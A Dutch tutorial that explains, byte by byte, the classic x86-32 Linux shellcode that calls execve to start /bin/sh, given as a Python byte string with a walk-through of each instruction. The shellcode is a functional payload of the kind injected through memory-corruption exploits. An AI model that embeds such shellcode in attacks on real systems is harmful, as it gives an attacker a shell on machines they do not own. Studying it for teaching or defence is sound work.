
# Shellcode voor het Aanroepen van een System Call Nummer 11 (execve)

Deze handleiding beschrijft shellcode die system call nummer 11 (execve) aanroept met drie argumenten: een pointer naar het programma dat we uitvoeren (`/bin/sh`) en twee null bytes (voor `argv` en `envp`).

## Overzicht

In de x86-32 Linux calling convention voor system calls wordt het system call nummer opgeslagen in het `%eax` register en de argumenten worden opgeslagen in de `%ebx`, `%ecx`, `%edx`, `%esi` en `%edi` registers.

In de onderstaande shellcode zetten we eerst het `%eax` register op nul (`xor eax, eax`) en pushen dit op de stack. Vervolgens wordt de string waarde `"/bin//sh"` op de stack gepusht.

De stack pointer (opgeslagen in `%esp`) wijst nu naar de null-terminated string `"/bin//sh"` op de stack. De stack pointer wordt verplaatst naar het `%ebx` register en is het eerste argument voor de call naar de `execve` system call.

Het tweede (`%ecx`) en derde (`%edx`) argument worden geïnitialiseerd op nul en tenslotte wordt het system call nummer (0xB) opgeslagen in het `%al` register (de onderste 8 bits van `%eax`). De system call wordt aangeroepen met een interrupt (`int 0x80`).

## Shellcode

```assembly
shellcode = "".join([
    "\x31\xc0",                 # xor eax, eax 
    "\x50",                     # push eax 
    "\x68\x2f\x2f\x73\x68",     # push 0x68732f2f ; //sh
    "\x68\x2f\x62\x69\x6e",     # push 0x6e69622f ; /bin 
    "\x89\xe3",                 # mov ebx, esp 
    "\x89\xc1",                 # mov ecx, eax
    "\x89\xc2",                 # mov edx, eax 
    "\xb0\x0b",                 # mov al, 0xb
    "\xcd\x80"                  # int 0x80
])
```

## Gedetailleerde Uitleg

1. **Initialisatie van `%eax` op nul:**
    ```assembly
    \x31\xc0    # xor eax, eax
    \x50        # push eax
    ```
    - Deze instructies zetten het `%eax` register op nul en pushen vervolgens deze nulwaarde op de stack.

2. **Pushing van de string `"/bin//sh"` op de stack:**
    ```assembly
    \x68\x2f\x2f\x73\x68    # push 0x68732f2f ; //sh
    \x68\x2f\x62\x69\x6e    # push 0x6e69622f ; /bin
    ```
    - Deze instructies pushen de string `"/bin//sh"` op de stack in omgekeerde volgorde.

3. **Verplaatsing van de stack pointer naar `%ebx`:**
    ```assembly
    \x89\xe3    # mov ebx, esp
    ```
    - Deze instructie verplaatst de huidige waarde van de stack pointer (`%esp`), die nu wijst naar de string `"/bin//sh"`, naar het `%ebx` register.

4. **Initialisatie van de overige registers:**
    ```assembly
    \x89\xc1    # mov ecx, eax
    \x89\xc2    # mov edx, eax
    ```
    - Deze instructies initialiseren het `%ecx` en `%edx` register op nul door de waarde van `%eax` (die nul is) naar deze registers te kopiëren.

5. **Instellen van het system call nummer en aanroepen van de system call:**
    ```assembly
    \xb0\x0b    # mov al, 0xb
    \xcd\x80    # int 0x80
    ```
    - Deze instructies zetten het system call nummer (0xB voor `execve`) in het `%al` register en roepen de system call aan met een software interrupt (`int 0x80`).

Met deze shellcode wordt de `execve` system call aangeroepen om de shell (`/bin/sh`) te starten met lege argumenten en omgevingsvariabelen.
